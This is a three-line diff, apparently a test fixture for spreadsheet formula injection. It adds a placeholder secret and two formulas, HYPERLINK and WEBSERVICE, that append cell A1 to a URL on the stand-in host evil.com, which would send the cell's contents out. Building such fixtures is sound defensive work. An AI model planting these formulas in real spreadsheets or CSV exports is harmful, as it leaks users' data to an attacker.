@@ -1,0 +1,3 @@
+s3cret
+=HYPERLINK(CONCATENATE("http://evil.com/";A1);"click me")
+=WEBSERVICE(CONCATENATE("http://evil.com/";A1))
